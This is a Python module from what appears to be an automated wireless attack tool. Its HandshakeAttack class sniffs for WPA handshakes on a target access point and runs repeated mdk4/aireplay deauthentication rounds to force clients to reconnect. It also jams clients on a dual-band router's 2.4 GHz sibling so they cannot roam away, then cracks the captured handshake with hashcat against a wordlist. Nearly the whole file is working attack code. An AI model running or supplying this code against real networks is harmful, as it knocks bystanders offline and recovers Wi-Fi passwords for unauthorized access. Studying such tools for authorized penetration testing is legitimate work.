"""WPA handshake capture and crack."""

from __future__ import annotations

import os
import re
import shutil
import time
from datetime import datetime, timezone

from ..models import AccessPoint, CrackResult, EncryptionType
from ..tools.aireplay import Aireplay
from ..tools.airodump import Airodump
from ..tools.client_filter import active_clients, filter_clients, is_heard_client, is_valid_client
from ..tools.interface import set_channel
from ..input import resolve_capture_health
from ..tools.capture_health import analyze_cap_health, reset_health_cache
from ..tools.handshake_detect import (
    cap_has_reconnect,
    check_handshake,
    extract_hash,
    extract_hash_preferred,
    find_hash_bssid,
    reset_check_cache,
)
from ..tools.hashcat import Hashcat, HcxTools
from ..tools.interface import recover_interface
from ..process import which
from .base import Attack, AttackResult

HCX_CHECK_INTERVAL = 2.0  # seconds between hcxpcapngtool scans on same cap size


class HandshakeAttack(Attack):
    name = "handshake"

    def can_attack(self) -> bool:
        if not self.cfg.attack.handshake:
            return False
        if self.ap.encryption not in (EncryptionType.WPA, EncryptionType.WPA2, EncryptionType.WPA3):
            return False
        if self.ap.is_enterprise:
            return False
        return True

    @staticmethod
    def _essid_root(essid: str | None) -> str:
        if not essid:
            return ""
        root = re.sub(r"(?i)(5\s*ghz|2\.?4\s*ghz|24\s*ghz|5g|2g)", "", essid)
        return re.sub(r"[^a-z0-9]", "", root.lower())

    def _sibling_band_ap(self) -> AccessPoint | None:
        """2.4 GHz partner AP for dual-band routers (shared PSK)."""
        if self.ap.channel <= 14:
            return None
        root = self._essid_root(self.ap.essid)
        best: AccessPoint | None = None
        pool = self.tracker.discovered_targets or self.tracker.targets
        for candidate in pool:
            if candidate.bssid == self.ap.bssid or candidate.channel > 14:
                continue
            if candidate.encryption not in (
                EncryptionType.WPA, EncryptionType.WPA2, EncryptionType.WPA3,
            ):
                continue
            other_root = self._essid_root(candidate.essid)
            if not root or not other_root:
                continue
            if root in other_root or other_root in root:
                if best is None or candidate.power > best.power:
                    best = candidate
        return best

    def _cap_bssids(self, extra: list[str] | None = None) -> list[str]:
        seen = {self.ap.bssid.upper()}
        out = [self.ap.bssid]
        for bssid in extra or []:
            mac = bssid.strip().upper()
            if mac not in seen:
                seen.add(mac)
                out.append(mac)
        sibling = self._sibling_band_ap()
        if sibling and sibling.bssid.upper() not in seen:
            seen.add(sibling.bssid.upper())
            out.append(sibling.bssid)
        pool = self.tracker.discovered_targets or self.tracker.targets
        for candidate in pool:
            if candidate.channel == self.ap.channel and candidate.bssid.upper() not in seen:
                seen.add(candidate.bssid.upper())
                out.append(candidate.bssid)
        return out

    def _prefer_hash_bssids(self, cap_path: str) -> list[str]:
        """Ordered BSSID preference list for hash extraction from *cap_path*."""
        prefer: list[str] = []
        seen: set[str] = set()

        def add(mac: str | None) -> None:
            if not mac:
                return
            key = mac.upper()
            if key not in seen:
                seen.add(key)
                prefer.append(key)

        add(getattr(self, "_cap_hit_bssid", None))
        add(self._cap_bssid_from_name(os.path.basename(cap_path)))
        add(self.ap.bssid)
        for mac in self._cap_bssids():
            add(mac)
        return prefer

    def _hash_from_cap(self, cap_path: str) -> tuple[str, str] | None:
        """Return (bssid, hash_line) for any crackable handshake in *cap_path*."""
        return extract_hash_preferred(cap_path, self._prefer_hash_bssids(cap_path))

    def _existing_cap(self) -> str | None:
        self._cap_hit_bssid = None
        if self.cfg.attack.new_handshake:
            return None
        hs_dir = self.cfg.output.handshake_dir
        if not os.path.isdir(hs_dir):
            return None
        check_order: list[tuple[str, str | None]] = [(self.ap.bssid, self.ap.essid)]
        sibling = self._sibling_band_ap()
        if sibling:
            check_order.append((sibling.bssid, sibling.essid))
        for bssid, essid in check_order:
            found = self._cap_in_hs_dir(hs_dir, bssid, essid)
            if found:
                path, hit_bssid, hit_essid = found
                self._cap_hit_bssid = hit_bssid
                if hit_bssid != self.ap.bssid:
                    label = hit_essid or hit_bssid
                    self.tracker.log(
                        f"Using [green]2.4GHz sibling[/] handshake from "
                        f"[cyan]{label}[/] (shared PSK)",
                        tag="handshake",
                    )
                return path
        root = self._essid_root(self.ap.essid)
        if root:
            for fname in sorted(os.listdir(hs_dir), reverse=True):
                if not fname.startswith("handshake_") or not fname.endswith(".cap"):
                    continue
                cap_essid = self._cap_essid_from_name(fname)
                if not cap_essid or not (
                    root in self._essid_root(cap_essid)
                    or self._essid_root(cap_essid) in root
                ):
                    continue
                cap_bssid = self._cap_bssid_from_name(fname)
                if not cap_bssid or cap_bssid == self.ap.bssid:
                    continue
                path = os.path.join(hs_dir, fname)
                if check_handshake(path, cap_bssid, cap_essid):
                    self._cap_hit_bssid = cap_bssid
                    self.tracker.log(
                        f"Using [green]band sibling[/] handshake from "
                        f"[cyan]{cap_essid}[/] (shared PSK)",
                        tag="handshake",
                    )
                    return path
        return None

    @staticmethod
    def _cap_bssid_from_name(fname: str) -> str | None:
        match = re.search(r"_([0-9A-F]{2}(?:-[0-9A-F]{2}){5})_", fname, re.IGNORECASE)
        if not match:
            return None
        return match.group(1).replace("-", ":").upper()

    @staticmethod
    def _cap_essid_from_name(fname: str) -> str | None:
        parts = fname.replace(".cap", "").split("_")
        if len(parts) < 3:
            return None
        return parts[1]

    def _cap_in_hs_dir(
        self, hs_dir: str, bssid: str, essid: str | None,
    ) -> tuple[str, str, str | None] | None:
        bssid_safe = re.escape(bssid.replace(":", "-"))
        pattern = re.compile(rf"handshake_.*_{bssid_safe}_.*\.cap")
        for fname in sorted(os.listdir(hs_dir), reverse=True):
            if not pattern.match(fname):
                continue
            path = os.path.join(hs_dir, fname)
            if check_handshake(path, bssid, essid):
                return path, bssid, essid
        return None

    def _save_cap(self, src: str) -> str:
        essid_safe = re.sub(r"[^a-zA-Z0-9]", "", self.ap.display_name)
        bssid_safe = self.ap.bssid.replace(":", "-")
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
        dst = os.path.join(
            self.cfg.output.handshake_dir,
            f"handshake_{essid_safe}_{bssid_safe}_{ts}.cap",
        )
        shutil.copy2(src, dst)
        return dst

    def run(self) -> AttackResult:
        self.tracker.clear_skip()
        self._cap_hit_bssid = None
        capture_started = time.time()
        timeout = self.cfg.attack.wpa_timeout

        self.status("init", "Checking cached handshakes...", timeout=timeout, started=capture_started)
        capfile = self._existing_cap()
        if capfile:
            self.status("capture", "Using cached handshake", timeout=timeout, started=capture_started)
            if os.path.basename(capfile).upper().find(self.ap.bssid.replace(":", "-").upper()) >= 0:
                self.tracker.log(
                    f"Found existing capture for {self.ap.display_name}", tag="handshake",
                )
            else:
                self.tracker.log(
                    f"Found existing capture → {os.path.basename(capfile)}", tag="handshake",
                )
        else:
            self._use_capture_health = resolve_capture_health(self.cfg, self.tracker)
            if self._use_capture_health:
                self.tracker.log("Live capture health panel enabled", tag="handshake")
            self.status("capture", "Recovering interface...", timeout=timeout, started=capture_started)
            iface = recover_interface(self.cfg.scan.interface, self.ap.channel)
            self.cfg.scan.interface = iface
            self.tracker.log(f"Listening on ch{self.ap.channel} for {timeout}s...", tag="handshake")
            capfile = self._capture(capture_started, timeout)

        if self.should_stop():
            return self.skipped_result()
        if not capfile:
            return AttackResult(False, message="Handshake capture failed")

        saved = capfile if capfile.startswith(self.cfg.output.handshake_dir) else self._save_cap(capfile)

        if self.cfg.attack.skip_crack or not self.cfg.attack.wordlist:
            self.status("done", f"Saved to {os.path.basename(saved)}", started=capture_started)
            return AttackResult(True, message=f"Handshake saved to {saved}")

        self.tracker.log("Converting cap → hashcat format...", tag="handshake")

        hash_result = self._hash_from_cap(saved)
        if not hash_result:
            return AttackResult(False, message="Failed to convert handshake to hash")
        hash_bssid, hash_line = hash_result
        if hash_bssid.upper() != self.ap.bssid.upper():
            self.tracker.log(
                f"Hash from [cyan]{hash_bssid}[/] (band sibling — shared PSK)",
                tag="handshake",
            )

        key = self.crack_hashcat(hash_line, capture_started)
        if self.should_stop():
            return self.skipped_result()
        if key:
            crack = CrackResult(
                bssid=self.ap.bssid, essid=self.ap.display_name, key=key,
                method="handshake", capture_file=saved,
                cracked_at=datetime.now(timezone.utc).isoformat(),
            )
            self.status("cracked", f"Key found: {key}", started=capture_started)
            return AttackResult(True, crack=crack, message=f"Handshake cracked: {key}")
        self.status("failed", "Password not in wordlist", started=capture_started)
        return AttackResult(False, message="Handshake captured but not cracked")

    def _merge_clients(
        self,
        clients: list[str],
        power: dict[str, int],
        raw: list[tuple[str, int]],
    ) -> list[str]:
        """Add valid, heard stations; return newly added MACs."""
        added: list[str] = []
        for station, pwr in raw:
            mac = station.strip().upper()
            if not is_valid_client(mac, self.ap.bssid):
                continue
            power[mac] = pwr
            if not is_heard_client(mac, power) or mac in clients:
                continue
            clients.append(mac)
            added.append(mac)
        return added

    def _seed_clients(self) -> tuple[list[str], dict[str, int]]:
        power = {c.station.upper(): c.power for c in self.ap.clients}
        clients = active_clients(
            filter_clients([c.station for c in self.ap.clients], self.ap.bssid),
            power,
            self.ap.bssid,
        )
        if clients:
            self.tracker.log(
                f"Seeded {len(clients)} active client(s): [green]{', '.join(clients)}[/]",
                tag="handshake",
            )
        return clients, power

    def _deauth_essid(self) -> str | None:
        if self.ap.essid_known and self.ap.essid:
            return self.ap.essid
        return None

    def _capture_health_stats(self, cap: str | None) -> dict[str, int | bool]:
        if not getattr(self, "_use_capture_health", False) or not cap:
            return {}
        return analyze_cap_health(cap, self.ap.bssid).as_stats()

    def _try_handshake(
        self,
        cap: str | None,
        *,
        clients: int,
        deauth_rounds: int,
        cap_kb: int,
        started: float,
        timeout: int,
        alt_bssids: list[str] | None = None,
    ) -> str | None:
        if not cap or not os.path.exists(cap) or os.path.getsize(cap) < 24:
            return None
        hit_bssid = find_hash_bssid(
            cap, self._cap_bssids(alt_bssids), min_interval=HCX_CHECK_INTERVAL,
        )
        if not hit_bssid:
            return None

        hash_line = extract_hash(cap, hit_bssid)
        if not hash_line:
            return None

        self.status(
            "capture", "Handshake captured!",
            timeout=timeout, started=started,
            clients=clients, deauths=deauth_rounds, cap_kb=cap_kb,
            **self._capture_health_stats(cap),
        )
        if hit_bssid.upper() != self.ap.bssid.upper():
            self.tracker.log(
                f"[green]Handshake on [cyan]{hit_bssid}[/] (same channel/router)",
                tag="handshake",
            )
        self._cap_hit_bssid = hit_bssid
        self.tracker.log("[green]Crackable handshake detected![/]", tag="handshake")
        try:
            saved = self._save_cap(cap)
            self.tracker.log(f"Saved capture → {saved}", tag="handshake")
            return saved
        except OSError as e:
            self.tracker.log(f"[red]failed to persist capture: {e}[/]", tag="handshake")
            return None

    def _band_block_deauth(self, heard: list[str]) -> None:
        """Kick clients off the 2.4 GHz sibling so they cannot roam away from 5 GHz."""
        sibling = self._sibling_band_ap()
        if not sibling or not heard:
            return
        iface = self.cfg.scan.interface
        set_channel(iface, sibling.channel)
        focus = heard[0]
        self.tracker.log(
            f"[yellow]Band-block[/]: deauth [cyan]{sibling.display_name}[/] ch{sibling.channel} "
            f"→ {focus}",
            tag="handshake",
        )
        Aireplay.deauth_round(
            self.cfg, sibling.bssid, heard,
            essid=sibling.essid if sibling.essid_known else None,
            focus=focus,
        )
        set_channel(iface, self.ap.channel)
        time.sleep(0.5)

    def _fallback_sibling_capture(self, started: float, timeout: int) -> str | None:
        sibling = self._sibling_band_ap()
        if not sibling:
            return None
        remain = max(30, int(timeout - (time.time() - started)))
        self.tracker.log(
            f"[yellow]5 GHz deauth ineffective[/] — capturing on "
            f"[cyan]{sibling.display_name}[/] ch{sibling.channel} ({remain}s, shared PSK)",
            tag="handshake",
        )
        saved_ap = self.ap
        self.ap = sibling
        try:
            return self._capture_band(started, remain, band_block=False)
        finally:
            self.ap = saved_ap

    def _capture(self, started: float, timeout: int) -> str | None:
        found = self._capture_band(started, timeout, band_block=self.ap.channel > 14)
        if found or self.ap.channel <= 14:
            return found
        return self._fallback_sibling_capture(started, timeout)

    def _capture_band(
        self,
        started: float,
        timeout: int,
        *,
        band_block: bool,
    ) -> str | None:
        clients, client_power = self._seed_clients()
        deadline = time.time() + timeout
        deauth_rounds = 0
        focus_idx = 0
        restart_count = 0
        essid = self._deauth_essid()
        reset_check_cache()
        reset_health_cache()
        channel_bssids: list[str] = []

        deauth_interval = max(12.0, float(self.cfg.attack.deauth_listen))
        post_deauth_rx = max(12.0, deauth_interval * 0.75)
        passive_first = 20.0 if self.ap.channel > 14 else 12.0
        next_deauth = time.time() + passive_first
        deauth_warned = False
        use_band_block = band_block

        try:
            with Airodump(self.cfg, channel=self.ap.channel, bssid=self.ap.bssid, prefix="hs") as dump:
                if not dump.alive():
                    self.tracker.log(
                        "[yellow]airodump-ng failed — recovering interface and retrying[/]",
                        tag="handshake",
                    )
                    self.cfg.scan.interface = recover_interface(self.cfg.scan.interface, self.ap.channel)
                    dump.restart()
                if not dump.alive():
                    self.tracker.log("[red]airodump-ng failed to start[/]", tag="handshake")
                    return None

                width = set_channel(self.cfg.scan.interface, self.ap.channel)
                band = "5GHz" if self.ap.channel > 14 else "2.4GHz"
                self.tracker.log(
                    f"Tuned to ch{self.ap.channel} ({band}, {width})",
                    tag="handshake",
                )
                if not self.cfg.attack.no_deauth:
                    self.tracker.log(
                        f"Reactive capture: passive [yellow]{passive_first:.0f}s[/], then "
                        f"mdk4/aireplay deauth every [yellow]{deauth_interval:.0f}s[/] → "
                        f"[green]{post_deauth_rx:.0f}s[/] EAPOL listen",
                        tag="handshake",
                    )

                while time.time() < deadline:
                    if self.abort_if_skipped():
                        return None
                    remaining = int(deadline - time.time())

                    if not dump.alive():
                        restart_count += 1
                        if restart_count > 5:
                            self.tracker.log("[red]airodump-ng keeps dying — aborting[/]", tag="handshake")
                            return None
                        self.tracker.log("[yellow]airodump-ng died — restarting[/]", tag="handshake")
                        self.cfg.scan.interface = recover_interface(self.cfg.scan.interface, self.ap.channel)
                        dump.restart()
                        time.sleep(1)
                        continue

                    targets = dump.parse_targets()
                    for t in targets:
                        if t.channel == self.ap.channel and t.bssid not in channel_bssids:
                            channel_bssids.append(t.bssid)
                    target = next((t for t in targets if t.bssid == self.ap.bssid), None)
                    if target:
                        raw = [(c.station, c.power) for c in target.clients]
                        added = self._merge_clients(clients, client_power, raw)
                        for mac in added:
                            pwr = client_power.get(mac, -1)
                            self.tracker.log(
                                f"New client: [green]{mac}[/] (pwr {pwr})",
                                tag="handshake",
                            )

                    cap = dump.get_cap_file()
                    cap_kb = os.path.getsize(cap) // 1024 if cap and os.path.exists(cap) else 0

                    found = self._try_handshake(
                        cap,
                        clients=len(clients),
                        deauth_rounds=deauth_rounds,
                        cap_kb=cap_kb,
                        started=started,
                        timeout=timeout,
                        alt_bssids=channel_bssids,
                    )
                    if found:
                        return found

                    now = time.time()
                    if not self.cfg.attack.no_deauth and now >= next_deauth:
                        deauth_rounds += 1
                        heard = active_clients(clients, client_power, self.ap.bssid)
                        stale = len(clients) - len(heard)
                        focus = heard[focus_idx % len(heard)] if heard else None
                        if heard:
                            focus_idx += 1
                        tool = "mdk4" if which("mdk4") else "aireplay"
                        if focus:
                            target_label = f"*broadcast* + {focus}"
                        elif heard:
                            target_label = f"*broadcast* + {heard[0]}"
                        else:
                            target_label = "*broadcast* only"
                        if stale > 0:
                            target_label += f" ({stale} stale ignored)"
                        self.tracker.log(
                            f"[yellow]Deauth round #{deauth_rounds}[/] via {tool} → {target_label}",
                            tag="handshake",
                        )
                        self.status(
                            "capture",
                            f"Deauth round #{deauth_rounds} ({remaining}s left)",
                            timeout=timeout,
                            started=started,
                            clients=len(heard) or len(clients),
                            deauths=deauth_rounds,
                            cap_kb=cap_kb,
                            **self._capture_health_stats(cap),
                        )
                        if use_band_block and heard:
                            self._band_block_deauth(heard)
                        Aireplay.deauth_round(
                            self.cfg, self.ap.bssid, heard, essid=essid, focus=focus,
                        )
                        next_deauth = now + deauth_interval
                        rx_until = min(deadline, now + post_deauth_rx)
                        while time.time() < rx_until:
                            if self.abort_if_skipped():
                                return None
                            cap = dump.get_cap_file()
                            cap_kb = os.path.getsize(cap) // 1024 if cap and os.path.exists(cap) else 0
                            found = self._try_handshake(
                                cap,
                                clients=len(heard) or len(clients),
                                deauth_rounds=deauth_rounds,
                                cap_kb=cap_kb,
                                started=started,
                                timeout=timeout,
                                alt_bssids=channel_bssids,
                            )
                            if found:
                                return found
                            time.sleep(0.5)
                        cap = dump.get_cap_file()
                        if (
                            cap
                            and deauth_rounds >= 2
                            and not deauth_warned
                            and not cap_has_reconnect(cap, self.ap.bssid)
                        ):
                            deauth_warned = True
                            band = "5 GHz" if self.ap.channel > 14 else "2.4 GHz"
                            self.tracker.log(
                                f"[yellow]No reconnect/EAPOL after {deauth_rounds} deauth rounds on "
                                f"{band} — client may ignore deauth, roam to another band, or use "
                                f"protected management frames. Trying passive listen + gentle deauth; "
                                f"consider PMKID for this target.[/]",
                                tag="handshake",
                            )
                        continue

                    heard = active_clients(clients, client_power, self.ap.bssid)
                    self.status(
                        "capture",
                        f"Listening ({remaining}s left, deauth in {int(next_deauth - now)}s)",
                        timeout=timeout,
                        started=started,
                        clients=len(heard) or len(clients),
                        deauths=deauth_rounds,
                        cap_kb=cap_kb,
                        **self._capture_health_stats(cap),
                    )
                    time.sleep(1.0)

                self.tracker.log("[yellow]Final handshake sweep...[/]", tag="handshake")
                reset_check_cache()
                cap = dump.get_cap_file()
                found = self._try_handshake(
                    cap,
                    clients=len(clients),
                    deauth_rounds=deauth_rounds,
                    cap_kb=os.path.getsize(cap) // 1024 if cap and os.path.exists(cap) else 0,
                    started=started,
                    timeout=timeout,
                    alt_bssids=channel_bssids,
                )
                if found:
                    return found

        except Exception as e:
            self.tracker.log(f"[red]capture error: {e}[/]", tag="handshake")
            return None

        self.tracker.log(f"[red]No handshake after {timeout}s[/]", tag="handshake")
        return None